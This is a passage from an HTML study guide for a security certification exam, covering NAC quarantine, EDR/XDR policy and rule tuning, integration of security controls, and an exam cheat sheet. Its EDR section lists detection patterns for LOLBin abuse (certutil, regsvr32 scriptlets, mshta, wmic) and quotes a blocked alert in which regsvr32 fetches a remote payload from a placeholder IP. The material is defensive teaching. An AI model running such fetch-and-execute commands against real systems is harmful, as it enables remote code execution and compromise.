+<span class="cg">NAC prevented infected laptop from reaching:</span>
+<span class="cg">  → File servers (no data access) ✓</span>
+<span class="cg">  → Email server (no spread via email) ✓</span>
+<span class="cg">  → Active Directory (no credential theft) ✓</span>
+<span class="cg">  → Other workstations (no lateral movement) ✓</span>
+
+IT Security: remote into laptop → clean malware
+After clean: EDR confirms → NAC: full access restored
+Total quarantine time: 2 hours
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">NAC →</span><span>Check device health before granting network access — not just who but what state</span></div>
+      <div class="er"><span class="ek">Posture assessment →</span><span>Check OS patches, AV, encryption, MDM enrollment, prohibited software</span></div>
+      <div class="er"><span class="ek">Quarantine VLAN →</span><span>Non-compliant devices isolated — can only reach remediation resources</span></div>
+      <div class="er"><span class="ek">802.1X →</span><span>Primary NAC enforcement for wired and wireless — RADIUS authenticates</span></div>
+      <div class="er"><span class="ek">Cisco ISE →</span><span>Most widely deployed NAC solution — enterprise standard</span></div>
+      <div class="er"><span class="ek">MAB →</span><span>MAC Authentication Bypass — for devices that can't do 802.1X (IoT, printers)</span></div>
+      <div class="er"><span class="ek">VLAN assignment →</span><span>NAC dynamically assigns correct VLAN based on identity + posture</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════════ -->
+<!-- 7. EDR / XDR                   -->
+<!-- ═══════════════════════════════ -->
+<div class="sec" id="s7">
+<div class="card">
+  <div class="card-hd"><span class="card-num">07</span><span class="card-title">Modifying EDR / XDR Policies</span><span class="bdg bdg-purple">Behavioral · Response · Tuning</span></div>
+  <div class="card-bd">
+    <p>EDR/XDR systems require <strong style="color:var(--text)">continuous policy modification</strong> to stay effective — new software causes false positives, new threats need detection rules, response actions need tuning. Managing EDR is an ongoing security operations task.</p>
+
+    <h3>EDR vs XDR Scope</h3>
+    <div class="code">
+<span class="cm"># What each covers:</span>
+
+<span class="cb">EDR — Endpoint Detection and Response:</span>
+Coverage: individual endpoint behavior
+  Process creation + parent/child relationships
+  File system changes
+  Registry modifications
+  Network connections from endpoint
+  Memory analysis
+
+<span class="ct">XDR — Extended Detection and Response:</span>
+Coverage: endpoint + network + cloud + email + identity
+  Everything EDR sees PLUS:
+  Network traffic patterns (NDR)
+  Cloud API activity (CSPM)
+  Email threat data
+  Identity anomalies (UEBA)
+  Correlated across ALL sources
+
+<span class="cm"># XDR = unified platform replacing separate tools</span>
+<span class="cm"># Single console, correlated detections, unified response</span>
+    </div>
+
+    <h3>EDR Policy Modifications</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--purple)">Detection Rule Creation</h4>
+        <p>Create custom behavioral rules for threats specific to your environment. Pen test found technique not caught by default rules. Threat intel reveals novel attack technique. Industry-specific attack patterns.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+<span class="cm"># Custom EDR rule (CrowdStrike IOA):</span>
+Trigger: Process creation
+Where: parent = excel.exe
+And:  child = powershell.exe OR cmd.exe
+And:  child has encoded command (-enc flag)
+Response: BLOCK + alert analyst
+Name: "Excel macro spawning encoded shell"
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Exclusions / Whitelisting</h4>
+        <p>Legitimate software triggers EDR false positives. Software deployment tools look like malware. IT scripts trigger behavioral rules. Security tools themselves trigger detections. Careful whitelisting prevents blocking business tools.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+<span class="cm"># SCCM deployment triggering EDR:</span>
+CcmExec.exe running encoded PowerShell
+EDR: BLOCKED — looks like malware!
+IT: that's Microsoft SCCM! legitimate!
+
+Fix: add path exclusion
+  C:\Windows\CCM\* → trusted process
+  Signed by Microsoft → allow
+<span class="cg">Result: SCCM works, real threats still detected ✓</span>
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--blue)">Response Policy Tuning</h4>
+        <p>Adjust what happens automatically when threat detected. High-confidence detections → auto-isolate. Lower confidence → alert only for analyst review. Time-based policies — less aggressive during maintenance.</p>
+        <div class="code" style="font-size:0.65rem;margin-top:0.5rem">
+<span class="cm"># Response tiering:</span>
+Severity Critical (100% confidence):
+  Auto: isolate host
+  Auto: kill process
+  Auto: alert P1
+  
+Severity High (80% confidence):
+  Auto: kill process
+  Auto: alert analyst
+  Manual: isolation decision
+
+Severity Medium (60% confidence):
+  Auto: alert analyst
+  Manual: all response actions
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--teal)">Threat Hunting Rules</h4>
+        <p>Create scheduled queries to proactively hunt for threats that haven't triggered alerts. "Show me all processes that have made connections to newly registered domains." Run weekly, investigate results manually.</p>
+      </div>
+    </div>
+
+    <h3>XDR Correlation Rules</h3>
+    <div class="code">
+<span class="cm"># XDR correlates across sources — example rule:</span>
+
+Rule: "Multi-stage attack — email to endpoint to cloud"
+Trigger when ALL of these occur within 60 minutes:
+  [Email] Suspicious attachment opened by user X
+  AND
+  [EDR] User X's endpoint spawns PowerShell
+  AND
+  [Network] User X's endpoint connects to new external IP
+  AND
+  [Cloud] User X's account accesses cloud storage for first time
+
+Each alone: low confidence
+All four together: <span class="cr">HIGH CONFIDENCE — active attack</span>
+Response: isolate endpoint + disable cloud account + P1 alert
+
+<span class="cm"># This catches what individual tools miss</span>
+<span class="cm"># The correlation is the detection</span>
+    </div>
+
+    <h3>EDR Rollback — Unique Feature</h3>
+    <div class="code">
+<span class="cm"># Some EDR platforms can UNDO ransomware damage:</span>
+
+Ransomware starts encrypting files:
+  file1.docx → file1.docx.locked
+  file2.xlsx → file2.xlsx.locked
+  file3.pptx → file3.pptx.locked
+
+EDR (SentinelOne) detects ransomware behavior
+EDR: kills ransomware process
+EDR ROLLBACK: uses VSS/shadow copies to restore
+  file1.docx.locked → file1.docx (restored!)
+  file2.xlsx.locked → file2.xlsx (restored!)
+  file3.pptx.locked → file3.pptx (restored!)
+
+<span class="cg">Result: no files permanently lost ✓</span>
+<span class="cg">Zero data recovery cost ✓</span>
+<span class="cm"># Available in: SentinelOne, some CrowdStrike tiers</span>
+<span class="cm"># Requires: EDR detect BEFORE VSS deletion</span>
+    </div>
+
+    <h3>EDR Deployment Considerations</h3>
+    <div class="g3">
+      <div class="gc">
+        <h4 style="color:var(--blue)">Agent Deployment</h4>
+        <p>EDR agent required on every endpoint — Windows, macOS, Linux, servers. Deploy via SCCM/Intune/Ansible. Verify coverage — unprotected endpoints = blind spots. Mobile devices: use MDM + MAM instead.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--green)">Audit vs Protect Mode</h4>
+        <p>New deployments start in Audit mode — detects but doesn't block. Build confidence — verify FP rate acceptable. After validation — switch to Protect mode. Same as detect vs block in IDS/IPS.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--red)">Performance Impact</h4>
+        <p>EDR agent uses CPU/RAM. Tune scanning aggressiveness for servers vs workstations. Exclude known-good high-frequency paths (database transaction logs). Balance security vs performance.</p>
+      </div>
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// Scenario — EDR Policy Update Catches Living-off-the-Land</div>
+      <div class="code">
+<span class="cm"># Threat intel: attackers using "living off the land" (LOLBins)</span>
+<span class="cm"># Using legitimate Windows tools as attack weapons</span>
+
+<span class="cb">Security team creates new EDR custom rules:</span>
+
+Rule 1 — certutil abuse:
+  certutil.exe -decode [any URL]
+  → ALERT (downloading + decoding = LOLBin abuse)
+
+Rule 2 — regsvr32 scriptlet:
+  regsvr32.exe /s /n /u /i:http://*
+  → BLOCK + ALERT (Squiblydoo technique)
+
+Rule 3 — mshta.exe external:
+  mshta.exe http://*
+  → BLOCK + ALERT (remote HTA execution)
+
+Rule 4 — wmic process call create:
+  wmic process call create "*powershell*"
+  → ALERT (WMIC spawning shells)
+
+<span class="co">One week after deploying new rules:</span>
+
+Thursday 14:23:
+  EDR alerts: regsvr32.exe /i:http://185.220.x.x/payload.sct
+  Host: MARKETING-PC-14, User: m.jones
+  Rule 2 triggered: <span class="cr">BLOCKED + P1 alert</span>
+
+Investigation:
+  m.jones received malicious email
+  Clicked link → JS downloaded
+  JS ran regsvr32 LOLBin technique
+  <span class="cg">EDR blocked at execution — no malware ran ✓</span>
+  <span class="cg">Custom rule caught what default rules missed ✓</span>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">EDR modifications →</span><span>Custom detection rules, exclusions for legit software, response policy tuning</span></div>
+      <div class="er"><span class="ek">XDR correlation →</span><span>Email + endpoint + network + cloud — combined detection across all sources</span></div>
+      <div class="er"><span class="ek">Audit vs Protect mode →</span><span>Start in audit (detect only) — validate — then switch to protect (block)</span></div>
+      <div class="er"><span class="ek">EDR rollback →</span><span>SentinelOne can reverse ransomware encryption using VSS — unique feature</span></div>
+      <div class="er"><span class="ek">LOLBins →</span><span>Living off the land — legit Windows tools used maliciously — custom EDR rules detect</span></div>
+      <div class="er"><span class="ek">False positive exclusions →</span><span>Whitelist legit software paths — SCCM, antivirus tools, IT scripts</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════════ -->
+<!-- 8. TUNING & INTEGRATION        -->
+<!-- ═══════════════════════════════ -->
+<div class="sec" id="s8">
+<div class="card">
+  <div class="card-hd"><span class="card-num">08</span><span class="card-title">Tuning, Integration & Operations</span><span class="bdg bdg-rose">Optimize · Connect · Operate</span></div>
+  <div class="card-bd">
+    <p>Individual security controls are much more powerful when they <strong style="color:var(--text)">work together</strong>. Integration allows tools to share data, trigger each other's actions, and present a unified view. Tuning keeps every control accurate and effective over time.</p>
+
+    <h3>How Controls Work Together</h3>
+    <div class="code">
+<span class="cm"># Integrated security ecosystem — one incident, all tools respond:</span>
+
+09:14:22 — <span class="cb">DNS Filter</span>: employee queries known-malicious domain
+           DNS filter: BLOCKED + alert sent to SIEM
+           Also: logs device IP (10.1.5.47)
+
+09:14:23 — <span class="cp">SIEM</span>: receives DNS block event
+           Queries: any other alerts for 10.1.5.47?
+           Finds: 3 failed login attempts (5 min ago)
+           Correlation: suspicious behavior pattern
+           <span class="cr">SIEM alert: "Possible compromise — 10.1.5.47"</span>
+
+09:14:24 — <span class="ct">EDR</span>: SIEM triggers EDR investigation on 10.1.5.47
+           EDR checks: any suspicious processes?
+           EDR finds: encoded PowerShell running
+           EDR response: KILL process + isolate host
+
+09:14:25 — <span class="co">NAC</span>: EDR signals host compromised
+           NAC: move 10.1.5.47 to quarantine VLAN
+           Host: cut off from all corporate resources
+
+09:14:26 — <span class="cg">DLP</span>: pre-isolation — no sensitive data left
+           DLP confirms: no exfiltration detected
+
+09:14:26 — <span class="cp">SOAR</span>: receives all events
+           Playbook: "Compromised endpoint"
+           Actions: notify analyst, owner, manager
+           Create P1 ticket with full context
+
+Time from DNS query to full containment: <span class="cg">4 seconds</span>
+    </div>
+
+    <h3>Tuning Best Practices for Each Control</h3>
+    <div style="overflow-x:auto;margin:1rem 0">
+    <table>
+      <tr><th>Control</th><th>Common Tuning Need</th><th>Solution</th><th>Review Frequency</th></tr>
+      <tr><td><span class="tag tb">Firewall</span></td><td>Unused/shadowed rules accumulate</td><td>Quarterly rule review, remove unused</td><td>Quarterly</td></tr>
+      <tr><td><span class="tag tr">IPS</span></td><td>Scanner triggers signature rules</td><td>Whitelist known scanner IPs</td><td>After each FP</td></tr>
+      <tr><td><span class="tag tt">DNS Filter</span></td><td>Legitimate sites miscategorized</td><td>Custom allow list, report to vendor</td><td>As needed</td></tr>
+      <tr><td><span class="tag to">DLP</span></td><td>Legit business email flagged</td><td>Trusted recipient exceptions</td><td>Monthly</td></tr>
+      <tr><td><span class="tag tg">NAC</span></td><td>New device type not profiled</td><td>Add device fingerprint profile</td><td>Per new device type</td></tr>
+      <tr><td><span class="tag tp">EDR</span></td><td>IT tools triggering detections</td><td>Path/hash exclusions for known tools</td><td>After each FP</td></tr>
+    </table>
+    </div>
+
+    <h3>The Tuning Cycle</h3>
+    <div class="flow" style="justify-content:center">
+      <div class="flow-box" style="background:#dbeafe;border-color:#bfdbfe;color:#1e40af">Deploy<br>control</div>
+      <span class="flow-arr">→</span>
+      <div class="flow-box" style="background:#f3e8ff;border-color:#e9d5ff;color:#6b21a8">Monitor<br>alerts</div>
+      <span class="flow-arr">→</span>
+      <div class="flow-box" style="background:#fef9c3;border-color:#fde68a;color:#854d0e">Identify<br>false +/-</div>
+      <span class="flow-arr">→</span>
+      <div class="flow-box" style="background:#ffedd5;border-color:#fed7aa;color:#9a3412">Adjust<br>rule/policy</div>
+      <span class="flow-arr">→</span>
+      <div class="flow-box" style="background:#dcfce7;border-color:#bbf7d0;color:#166534">Validate<br>change</div>
+      <span class="flow-arr">→</span>
+      <div class="flow-box" style="background:#f3e8ff;border-color:#e9d5ff;color:#6b21a8">Monitor<br>alerts</div>
+    </div>
+
+    <h3>SIEM as Integration Hub</h3>
+    <div class="code">
+<span class="cm"># SIEM receives events from ALL controls:</span>
+
+Firewall logs → SIEM:
+  "DENY 185.220.x.x → 10.0.0.1:22"
+
+IPS alerts → SIEM:
+  "SQL injection attempt blocked on web-server-01"
+
+DNS filter logs → SIEM:
+  "Blocked: evil-c2.ru from 10.1.5.47"
+
+DLP alerts → SIEM:
+  "Sensitive data email blocked — user j.smith"
+
+NAC events → SIEM:
+  "Device 10.1.5.47 moved to quarantine VLAN"
+
+EDR alerts → SIEM:
+  "Malware detected and killed on LAPTOP-047"
+
+<span class="cm"># SIEM correlates all of these:</span>
+Same IP appearing in firewall + DNS + EDR alerts?
+<span class="cr">= active compromise in progress → correlate → P1 alert</span>
+
+<span class="cg">Individual tools see pieces — SIEM sees the whole picture</span>
+    </div>
+
+    <h3>Threat Intelligence Integration</h3>
+    <div class="g3">
+      <div class="gc">
+        <h4 style="color:var(--blue)">Firewall + Threat Intel</h4>
+        <p>Threat intel feeds auto-populate firewall blocklists. Known C2 IPs → auto-blocked. Tor exit nodes → blocked. Updated daily/hourly from feeds like Emerging Threats, CISA, commercial feeds.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--teal)">DNS + Threat Intel</h4>
+        <p>Known malicious domains auto-added to DNS blocklist. New C2 infrastructure discovered → immediately blocked across entire organization. Faster than waiting for AV signatures.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">EDR + Threat Intel</h4>
+        <p>Known malware hashes auto-blocked. New malware family discovered → all endpoints immediately protected. Indicator of compromise (IoC) → scan all endpoints for matching artifacts.</p>
+      </div>
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// Scenario — Annual Security Control Review</div>
+      <div class="code">
+<span class="cm"># Annual review of all enterprise security controls:</span>
+
+<span class="cb">Firewall review:</span>
+  Total rules: 847
+  Rules never matched (last 12 months): <span class="cr">234 rules</span>
+  Action: remove 234 unused rules (234 fewer attack paths)
+  Rules with "any" source: <span class="cr">12 rules</span>
+  Action: tighten to specific source IPs
+
+<span class="cb">IDS/IPS review:</span>
+  False positive rate: <span class="cr">34% (too high)</span>
+  Top FP source: vulnerability scanner (fix: whitelist)
+  Signatures last updated: <span class="cr">67 days ago</span>
+  Action: enable auto-update, target FP rate <5%
+
+<span class="cb">DNS filter review:</span>
+  Business sites blocked: <span class="co">23 legitimate sites</span>
+  Action: submit to vendor for recategorization + add to allow list
+  New threat categories: add "Newly Registered Domains"
+
+<span class="cb">DLP review:</span>
+  False positives from finance team: <span class="cr">847 this year</span>
+  Pattern: auditor emails all flagged
+  Action: add trusted recipient exception for Big4 auditors
+
+<span class="cb">NAC review:</span>
+  New device types (last year): IoT thermostats
+  Profile: not in NAC fingerprint database
+  Action: add thermostat profile → auto-assign IoT VLAN
+
+<span class="cb">EDR review:</span>
+  New SCCM version: <span class="cr">triggering false positives</span>
+  Action: update exclusion paths for SCCM v2407
+  Coverage: <span class="co">847/850 endpoints (3 missing)</span>
+  Action: investigate 3 endpoints, deploy agent
+
+<span class="cg">Total improvement: 40% fewer false positives year-over-year ✓</span>
+<span class="cg">Security posture: measurably stronger ✓</span>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">Security integration →</span><span>Controls sharing data — DNS block triggers SIEM correlation triggers EDR action</span></div>
+      <div class="er"><span class="ek">False positive tuning →</span><span>Too many FPs = alert fatigue = real threats missed — tune all controls</span></div>
+      <div class="er"><span class="ek">Rule review →</span><span>Remove unused firewall rules quarterly — fewer rules = smaller attack surface</span></div>
+      <div class="er"><span class="ek">Threat intel integration →</span><span>Feeds auto-update firewall blocklists, DNS blocklists, EDR hash blacklists</span></div>
+      <div class="er"><span class="ek">SIEM as hub →</span><span>All controls feed SIEM — correlation reveals attacks individual tools miss</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ═══════════════════════════════ -->
+<!-- 9. SUMMARY                     -->
+<!-- ═══════════════════════════════ -->
+<div class="sec" id="s9">
+<div class="card">
+  <div class="card-hd"><span class="card-num">09</span><span class="card-title">Complete Summary — Exam Cheat Sheet</span><span class="bdg bdg-indigo">All Controls</span></div>
+  <div class="card-bd">
+
+    <h3>Enterprise Controls Quick Reference</h3>
+    <div style="overflow-x:auto;margin-bottom:1.5rem">
+    <table>
+      <tr><th>Control</th><th>What It Does</th><th>Where It Sits</th><th>Modification Focus</th></tr>
+      <tr>
+        <td><span class="tag tb">Firewall</span></td>
+        <td>Allow/deny traffic by IP, port, app, user</td>
+        <td>Perimeter + internal + host</td>
+        <td>Add/remove rules, tighten scope, zone configs</td>
+      </tr>
+      <tr>
+        <td><span class="tag tr">IDS</span></td>
+        <td>Detect malicious traffic — alert only</td>
+        <td>Out of band (SPAN port/TAP)</td>
+        <td>Add signatures, tune FPs, whitelist scanners</td>
+      </tr>
+      <tr>
+        <td><span class="tag tr">IPS</span></td>
+        <td>Detect AND block malicious traffic</td>
+        <td>Inline between zones</td>
+        <td>Start detect mode → validate → block mode</td>
+      </tr>
+      <tr>
+        <td><span class="tag tt">DNS Filter</span></td>
+        <td>Block bad domains before connection</td>
+        <td>Between clients and resolver</td>
+        <td>Add blocklist domains, allow exceptions, sinkhole</td>
+      </tr>
+      <tr>
+        <td><span class="tag to">DLP</span></td>
+        <td>Prevent sensitive data leaving org</td>
+        <td>Network inline + endpoint agent + cloud</td>
+        <td>Add data categories, tune FPs, trusted exceptions</td>
+      </tr>
+      <tr>
+        <td><span class="tag tg">NAC</span></td>
+        <td>Check device health before network access</td>
+        <td>802.1X on switches/APs, VPN gateway</td>
+        <td>Add posture checks, VLAN assignments, device profiles</td>
+      </tr>
+      <tr>
+        <td><span class="tag tp">EDR</span></td>
+        <td>Endpoint behavior monitoring + response</td>
+        <td>Agent on every endpoint</td>
+        <td>Custom detection rules, exclusions, response actions</td>
+      </tr>
+      <tr>
+        <td><span class="tag tp">XDR</span></td>
+        <td>Unified detection across all vectors</td>
+        <td>Cloud platform — unified view</td>
+        <td>Cross-source correlation rules, integrated playbooks</td>
+      </tr>
+    </table>
+    </div>
+
+    <h3>Modification Principles — All Controls</h3>
+    <div class="matrix">
+      <div class="m-cell" style="background:#eff6ff;border-color:#bfdbfe">
+        <strong style="color:var(--blue)">Change Management</strong>
+        All changes go through formal process. Emergency process for incidents. Document everything.
+      </div>
+      <div class="m-cell" style="background:#f0fdf4;border-color:#bbf7d0">
+        <strong style="color:var(--green)">Test Before Prod</strong>
+        Staging environment first. Validate: blocks what it should, allows what it should.
+      </div>
+      <div class="m-cell" style="background:#f3e8ff;border-color:#e9d5ff">
+        <strong style="color:var(--purple)">Detect Before Block</strong>
+        New rules start in detect/audit mode. Validate FP rate. Then promote to block/protect.
+      </div>
+      <div class="m-cell" style="background:#ffedd5;border-color:#fed7aa">
+        <strong style="color:var(--orange)">Tune Continuously</strong>
+        Regular review of FP rates. Remove unused rules. Update signatures. Tighten over time.
+      </div>
+      <div class="m-cell" style="background:#fef9c3;border-color:#fde68a">
+        <strong style="color:var(--yellow)">Least Privilege</strong>
+        Firewall rules as specific as possible. DLP exceptions minimal scope. NAC minimum access.
+      </div>
+      <div class="m-cell" style="background:#ccfbf1;border-color:#99f6e4">
+        <strong style="color:var(--teal)">Integrate All Controls</strong>
+        All tools feed SIEM. Controls trigger each other. Single alert = multiple tool response.
+      </div>
+    </div>
+
+    <h3>Scenario → Answer Cheat Sheet</h3>
+    <div class="exam" style="margin:0">
+      <h4>// Exam Scenarios → Answers</h4>
+      <div class="er"><span class="ek">"Traffic blocked unless explicitly allowed"</span><span>→ Implicit deny — firewall default behavior</span></div>
+      <div class="er"><span class="ek">"Rules evaluated top to bottom, first match wins"</span><span>→ Firewall rule order — priority-based processing</span></div>
+      <div class="er"><span class="ek">"Block attacker IP range immediately during incident"</span><span>→ Emergency firewall rule — highest priority, document within 1 hour</span></div>
+      <div class="er"><span class="ek">"Compromised DMZ server should not reach AD"</span><span>→ Firewall zone rules — minimal DMZ → Internal traffic</span></div>
+      <div class="er"><span class="ek">"IDS or IPS — which cannot block traffic?"</span><span>→ IDS (out of band) — alerts only — IPS blocks</span></div>
+      <div class="er"><span class="ek">"New IPS rule causing false positives in production"</span><span>→ Should have started in DETECT mode first — validate before BLOCK</span></div>
+      <div class="er"><span class="ek">"Vulnerability scanner triggering IPS alerts"</span><span>→ Add scanner IP to IPS exception/whitelist</span></div>
+      <div class="er"><span class="ek">"Block access to malicious domain before connection"</span><span>→ DNS filtering / DNS sinkhole</span></div>
+      <div class="er"><span class="ek">"Infected machine keeps calling home — how to identify others"</span><span>→ DNS sinkhole — logs all devices querying C2 domain</span></div>
+      <div class="er"><span class="ek">"DNS queries encrypted — bypasses corporate DNS filter"</span><span>→ DNS over HTTPS (DoH) — block at firewall or disable in browsers via GPO</span></div>
+      <div class="er"><span class="ek">"DNS response signed cryptographically"</span><span>→ DNSSEC — prevents DNS poisoning/spoofing</span></div>
+      <div class="er"><span class="ek">"Employee emails customer database to personal Gmail"</span><span>→ DLP (network or endpoint) should catch and block this</span></div>
+      <div class="er"><span class="ek">"Copy to USB drive blocked — what type of DLP?"</span><span>→ Endpoint DLP — agent on device controls USB writes</span></div>
+      <div class="er"><span class="ek">"Hash-based exact document matching in DLP"</span><span>→ Data fingerprinting — most accurate, lowest FPs</span></div>
+      <div class="er"><span class="ek">"SaaS file sharing monitored by DLP"</span><span>→ Cloud DLP / CASB (Cloud Access Security Broker)</span></div>
+      <div class="er"><span class="ek">"Check device health before granting network access"</span><span>→ NAC (Network Access Control) — posture assessment</span></div>
+      <div class="er"><span class="ek">"Non-compliant device gets internet only"</span><span>→ NAC quarantine VLAN — remediate then re-admit</span></div>
+      <div class="er"><span class="ek">"Printer assigned to IoT VLAN automatically"</span><span>→ NAC agentless — MAC OUI/device fingerprinting</span></div>
+      <div class="er"><span class="ek">"Per-device credentials for Wi-Fi — not shared password"</span><span>→ WPA2/WPA3 Enterprise + NAC 802.1X</span></div>
+      <div class="er"><span class="ek">"Endpoint detects by behavior not signatures"</span><span>→ EDR behavioral detection — catches zero-days</span></div>
+      <div class="er"><span class="ek">"EDR can reverse ransomware file encryption"</span><span>→ EDR rollback — SentinelOne — uses VSS shadow copies</span></div>
+      <div class="er"><span class="ek">"Unified detection: email + endpoint + cloud"</span><sp
